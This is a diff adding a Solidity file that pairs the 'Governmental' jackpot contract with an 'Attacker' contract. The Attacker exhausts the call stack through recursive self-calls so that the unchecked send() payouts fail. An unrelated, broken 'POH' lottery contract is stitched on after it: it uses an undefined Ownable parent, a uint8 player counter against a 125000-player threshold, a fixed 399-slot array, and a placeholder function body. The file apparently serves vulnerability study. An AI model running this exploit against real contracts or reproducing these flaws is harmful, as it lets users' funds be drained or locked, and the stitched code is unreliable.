@@ -1,0 +1,115 @@
+ 
+
+ 
+pragma solidity ^0.4.0;
+
+contract Governmental {
+  address public owner;
+  address public lastInvestor;
+  uint public jackpot = 1 ether;
+  uint public lastInvestmentTimestamp;
+  uint public ONE_MINUTE = 1 minutes;
+
+  function Governmental() {
+    owner = msg.sender;
+    if (msg.value<1 ether) throw;
+  }
+
+  function invest() {
+    if (msg.value<jackpot/2) throw;
+    lastInvestor = msg.sender;
+    jackpot += msg.value/2;
+     
+    lastInvestmentTimestamp = block.timestamp;
+  }
+
+  function resetInvestment() {
+    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
+      throw;
+
+    lastInvestor.send(jackpot);
+    owner.send(this.balance-1 ether);
+
+    lastInvestor = 0;
+    jackpot = 1 ether;
+    lastInvestmentTimestamp = 0;
+  }
+}
+
+contract Attacker {
+
+  function attack(address target, uint count) {
+    if (0<=count && count<1023) {
+      this.attack.gas(msg.gas-2000)(target, count+1);
+    }
+    else {
+      Governmental(target).resetInvestment();
+    }
+  }
+}
+
+library SafeMath {
+  function add(uint256 a, uint256 b) internal constant returns (uint256) {
+    uint256 c = a + b;
+    assert(c >= a);
+    return c;
+  }
+}
+
+contract POH is Ownable {
+  using SafeMath for uint256;
+
+  uint256 public priceOfTicket = 1e15 wei;
+  uint256 public lastTicketNumber = 0;
+  uint8 public playersSignedUp = 0;
+  uint public playersRequired = 125000;
+
+  event newContribution(address contributor, uint value);
+
+  address[] public players = new address[](399);
+  mapping (address => tickets[]) ticketsMap;
+  mapping(address => address) public referral;
+  mapping (address => uint256) public contributions;
+
+  struct tickets {
+    uint256 startTicket;
+    uint256 endTicket;
+  }
+
+  function executeLottery() {
+    // Implementation as provided
+  }
+
+  function joinwithreferral(address refer) payable {
+    uint256 weiAmount = msg.value;
+    require(weiAmount >= 1e16);
+
+    bool isSenderAdded = false;
+    for (uint8 i = 0; i < playersSignedUp; i++) {
+      if (players[i] == msg.sender) {
+        isSenderAdded = true;
+        break;
+      }
+    }
+    if (!isSenderAdded) {
+      players[playersSignedUp] = msg.sender;
+      referral[msg.sender] = refer;
+      playersSignedUp++;
+    }
+
+    tickets memory senderTickets;
+    senderTickets.startTicket = lastTicketNumber;
+    uint256 numberOfTickets = (weiAmount / priceOfTicket);
+    senderTickets.endTicket = lastTicketNumber.add(numberOfTickets);
+    lastTicketNumber = lastTicketNumber.add(numberOfTickets);
+    ticketsMap[msg.sender].push(senderTickets);
+
+    contributions[msg.sender] = contributions[msg.sender].add(weiAmount);
+
+    newContribution(msg.sender, weiAmount);
+
+    if (playersSignedUp > playersRequired) {
+      executeLottery();
+    }
+  }
+}
